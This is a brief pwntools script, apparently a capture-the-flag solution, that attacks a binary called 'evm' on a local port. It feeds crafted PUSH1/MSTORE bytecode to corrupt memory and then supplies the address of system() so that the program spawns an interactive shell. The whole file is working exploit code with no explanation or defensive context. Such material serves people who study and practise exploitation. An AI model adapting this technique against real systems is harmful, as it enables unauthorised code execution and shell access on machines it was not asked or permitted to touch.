from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#io = process("./evm")
io = remote("localhost", "54307")
elf = ELF("./evm")
context.log_level = "debug"

MSTORE = b'\x52'
PUSH1 = b'\x60'
code1 = PUSH1+b'\xf0\x35'+PUSH1+b'\xf8\xf6'+MSTORE
code2 = PUSH1+b'\x40\x00'+PUSH1+b'\xf9\xf6'+MSTORE
code3 = PUSH1+b'\x01\x00'+PUSH1+b'\xb2\xf6'+MSTORE
code4 = PUSH1+b'sh'+PUSH1+b'\x00\x00'+b'\x00'
io.sendlineafter("Gimme ur bytecode: ", code1+code2+code3+code4)
io.sendlineafter("Name ur program: ", p64(elf.plt['system']))

io.interactive()